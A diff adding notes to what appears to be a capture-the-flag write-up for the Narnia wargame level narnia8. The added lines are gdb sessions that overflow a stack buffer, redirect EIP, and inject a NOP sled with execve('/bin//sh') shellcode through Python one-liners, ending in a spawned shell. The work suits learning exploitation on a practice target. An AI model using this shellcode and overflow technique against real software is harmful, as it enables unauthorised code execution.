@@ -252,7 +252,7 @@ Breakpoint 2, 0x08048492 in func ()
 0xffffd980:	0x36333b31	0x3d686d3a	0x703a3030	0x30343d69
 (gdb) c
 Continuing.
-## Right now *0xffffd69c still points to the correct place (0xffffd89f)
+## Right now *0xffffd69f still points to the correct place (0xffffd89f)
 Breakpoint 2, 0x08048492 in func ()
 (gdb) x/200x $esp
 0xffffd670:	0xffffd688	0x00000000	0x00000014	0xf7e55fe3
@@ -280,7 +280,7 @@ Breakpoint 2, 0x08048492 in func ()
 0xffffd980:	0x36333b31	0x3d686d3a	0x703a3030	0x30343d69
 (gdb) c
 Continuing.
-## Now *0xffffd69c has its last byte overwritten by B
+## Now *0xffffd69f has its last byte overwritten by B
 Breakpoint 2, 0x08048492 in func ()
 (gdb) x/200x $esp
 0xffffd670:	0xffffd688	0x00000000	0x00000014	0xf7e55fe3
@@ -311,5 +311,167 @@ Continuing.
 
 Program received signal SIGSEGV, Segmentation fault.
 0x08048492 in func ()
-## Now *0xffffd69c is somehow 0xffffff42 ?!?!? wat? where did that value come from?
+## Now *0xffffd69f is somehow 0xffffff42 ?!?!? wat? where did that value come from?
 
+============ Gonna try to play with that 0xffffff42 ==================================
+I'm going to try to keep the address pointing to the place it was before crashing, in this case 0xffffd89f
+
+(gdb) r $(python -c'print "A"*20+"\x9f\xd8\xff\xff"+"B"*64')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /narnia/narnia8 $(python -c'print "A"*20+"\x9f\xd8\xff\xff"+"B"*64')
+
+Breakpoint 1, 0x080484a7 in func ()
+(gdb) x/200x $esp
+0xffffd670:	0x08048580	0xffffd688	0x00000014	0xf7e55fe3
+0xffffd680:	0x00000000	0x002c307d	0x41414141	0x41414141
+0xffffd690:	0x41414141	0x41414141	0x41414141	0xffffd89f
+0xffffd6a0:	0x42424242	0x42424242	0x42424242	0x42424242
+0xffffd6b0:	0x42424242	0x42424242	0x42424242	0x42424242
+0xffffd6c0:	0x42424242	0x42424242	0x42424242	0x42424242
+0xffffd6d0:	0x42424242	0x42424242	0x42424242	0x42424242
+0xffffd6e0:	0x00000002	0xffffd764	0xffffd704	0x080497a4
+0xffffd6f0:	0x0804820c	0xf7fcc000	0x00000000	0x00000000
+0xffffd700:	0x00000000	0x9703d45b	0xaf3b504b	0x00000000
+-- redacted
+0xffffd880:	0x00000000	0x00000000	0x00000000	0x2f000000
+0xffffd890:	0x6e72616e	0x6e2f6169	0x696e7261	0x41003861
+0xffffd8a0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd8b0:	0x9f414141	0x42ffffd8	0x42424242	0x42424242
+0xffffd8c0:	0x42424242	0x42424242	0x42424242	0x42424242
+0xffffd8d0:	0x42424242	0x42424242	0x42424242	0x42424242
+0xffffd8e0:	0x42424242	0x42424242	0x42424242	0x42424242
+0xffffd8f0:	0x42424242	0x00424242	0x4c454853	0x622f3d4c
+0xffffd900:	0x622f6e69	0x00687361	0x4d524554	0x6574783d
+0xffffd910:	0x322d6d72	0x6f633635	0x00726f6c	0x5f485353
+0xffffd920:	0x45494c43	0x313d544e	0x312e3237	0x2e302e38
+0xffffd930:	0x30352031	0x20303737	0x53003232	0x545f4853
+0xffffd940:	0x2f3d5954	0x2f766564	0x2f737470	0x434c0030
+0xffffd950:	0x4c4c415f	0x5500433d	0x3d524553	0x6e72616e
+0xffffd960:	0x00386169	0x435f534c	0x524f4c4f	0x73723d53
+0xffffd970:	0x643a303d	0x31303d69	0x3a34333b	0x303d6e6c
+0xffffd980:	0x36333b31	0x3d686d3a	0x703a3030	0x30343d69
+(gdb) si
+0x080482f0 in printf@plt ()
+(gdb) finish
+Run till exit from #0  0x080482f6 in printf@plt ()
+AAAAAAAAAAAAAAAAAAAA����BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+0x080484ac in func ()
+(gdb) disas func
+Dump of assembler code for function func:
+   0x0804842d <+0>:	push   ebp
+   0x0804842e <+1>:	mov    ebp,esp
+   0x08048430 <+3>:	sub    esp,0x38
+   0x08048433 <+6>:	mov    eax,DWORD PTR [ebp+0x8]
+   0x08048436 <+9>:	mov    DWORD PTR [ebp-0xc],eax
+   0x08048439 <+12>:	mov    DWORD PTR [esp+0x8],0x14
+   0x08048441 <+20>:	mov    DWORD PTR [esp+0x4],0x0
+   0x08048449 <+28>:	lea    eax,[ebp-0x20]
+   0x0804844c <+31>:	mov    DWORD PTR [esp],eax
+   0x0804844f <+34>:	call   0x8048320 <memset@plt>
+   0x08048454 <+39>:	mov    DWORD PTR ds:0x80497b8,0x0
+   0x0804845e <+49>:	jmp    0x8048486 <func+89>
+   0x08048460 <+51>:	mov    eax,ds:0x80497b8
+   0x08048465 <+56>:	mov    edx,DWORD PTR ds:0x80497b8
+   0x0804846b <+62>:	mov    ecx,edx
+   0x0804846d <+64>:	mov    edx,DWORD PTR [ebp-0xc]
+   0x08048470 <+67>:	add    edx,ecx
+   0x08048472 <+69>:	movzx  edx,BYTE PTR [edx]
+   0x08048475 <+72>:	mov    BYTE PTR [ebp+eax*1-0x20],dl
+   0x08048479 <+76>:	mov    eax,ds:0x80497b8
+   0x0804847e <+81>:	add    eax,0x1
+   0x08048481 <+84>:	mov    ds:0x80497b8,eax
+   0x08048486 <+89>:	mov    eax,ds:0x80497b8
+   0x0804848b <+94>:	mov    edx,eax
+   0x0804848d <+96>:	mov    eax,DWORD PTR [ebp-0xc]
+   0x08048490 <+99>:	add    eax,edx
+   0x08048492 <+101>:	movzx  eax,BYTE PTR [eax]
+   0x08048495 <+104>:	test   al,al
+   0x08048497 <+106>:	jne    0x8048460 <func+51>
+   0x08048499 <+108>:	lea    eax,[ebp-0x20]
+   0x0804849c <+111>:	mov    DWORD PTR [esp+0x4],eax
+   0x080484a0 <+115>:	mov    DWORD PTR [esp],0x8048580
+   0x080484a7 <+122>:	call   0x80482f0 <printf@plt>
+=> 0x080484ac <+127>:	leave  
+   0x080484ad <+128>:	ret    
+End of assembler dump.
+(gdb) si
+0x080484ad in func ()
+(gdb) si
+0x42424242 in ?? ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+
+SWEEEEEEEEEEEET now we can use this to plop a payload in there
+
+=============================================================================
+I grabbed the payload from narnia4, 25 bytes long, found the loaction of the highjacked eip (4*Cs), added the nop sled
+
+(gdb) r $(python -c'print "A"*20+"\x9f\xd8\xff\xff"+"B"*12+"CCCC"+"\x90"*(64-25-16)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /narnia/narnia8 $(python -c'print "A"*20+"\x9f\xd8\xff\xff"+"B"*12+"CCCC"+"\x90"*(64-25-16)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
+
+Breakpoint 1, 0x080484a7 in func ()
+(gdb) c
+Continuing.
+AAAAAAAAAAAAAAAAAAAA����BBBBBBBBBBBBCCCC�����������������������1�Ph//shh/bin��PS���°
+                                                                                    
+
+Program received signal SIGSEGV, Segmentation fault.
+0x43434343 in ?? ()
+(gdb) r $(python -c'print "A"*20+"\x9f\xd8\xff\xff"+"B"*12+"CCCC"+"\x90"*(64-25-16)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /narnia/narnia8 $(python -c'print "A"*20+"\x9f\xd8\xff\xff"+"B"*12+"CCCC"+"\x90"*(64-25-16)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
+
+Breakpoint 1, 0x080484a7 in func ()
+(gdb) x/100x $esp
+0xffffd670:	0x08048580	0xffffd688	0x00000014	0xf7e55fe3
+0xffffd680:	0x00000000	0x002c307d	0x41414141	0x41414141
+0xffffd690:	0x41414141	0x41414141	0x41414141	0xffffd89f
+0xffffd6a0:	0x42424242	0x42424242	0x42424242	0x43434343
+0xffffd6b0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd6c0:	0x90909090	0x31909090	0x2f6850c0	0x6868732f
+0xffffd6d0:	0x6e69622f	0x5350e389	0xc289e189	0x80cd0bb0
+0xffffd6e0:	0x00000002	0xffffd764	0xffffd704	0x080497a4
+0xffffd6f0:	0x0804820c	0xf7fcc000	0x00000000	0x00000000
+0xffffd700:	0x00000000	0xea03394b	0xd23bbd5b	0x00000000
+0xffffd710:	0x00000000	0x00000000	0x00000002	0x08048330
+0xffffd720:	0x00000000	0xf7ff04c0	0xf7e3c9e9	0xf7ffd000
+0xffffd730:	0x00000002	0x08048330	0x00000000	0x08048351
+0xffffd740:	0x080484ae	0x00000002	0xffffd764	0x080484f0
+0xffffd750:	0x08048560	0xf7feb160	0xffffd75c	0x0000001c
+0xffffd760:	0x00000002	0xffffd88f	0xffffd89f	0x00000000
+0xffffd770:	0xffffd8f8	0xffffd908	0xffffd91c	0xffffd93b
+0xffffd780:	0xffffd94e	0xffffd957	0xffffd964	0xffffde85
+0xffffd790:	0xffffde90	0xffffde9c	0xffffdefa	0xffffdf11
+0xffffd7a0:	0xffffdf20	0xffffdf32	0xffffdf43	0xffffdf4c
+0xffffd7b0:	0xffffdf5f	0xffffdf67	0xffffdf77	0xffffdfa6
+0xffffd7c0:	0xffffdfc6	0x00000000	0x00000020	0xf7fdbbe0
+0xffffd7d0:	0x00000021	0xf7fdb000	0x00000010	0x178bfbff
+0xffffd7e0:	0x00000006	0x00001000	0x00000011	0x00000064
+0xffffd7f0:	0x00000003	0x08048034	0x00000004	0x00000020
+(gdb) r $(python -c'print "A"*20+"\x9f\xd8\xff\xff"+"B"*12+"\xb0\xd6\xff\xff"+"\x90"*(64-25-16)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /narnia/narnia8 $(python -c'print "A"*20+"\x9f\xd8\xff\xff"+"B"*12+"\xb0\xd6\xff\xff"+"\x90"*(64-25-16)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
+
+Breakpoint 1, 0x080484a7 in func ()
+(gdb) c
+Continuing.
+AAAAAAAAAAAAAAAAAAAA����BBBBBBBBBBBB���������������������������1�Ph//shh/bin��PS���°
+                                                                                    
+process 494 is executing new program: /bin/dash
+Warning:
+Cannot insert breakpoint 1.
+Cannot access memory at address 0x80484a7
+
+hmmmm, whacky....
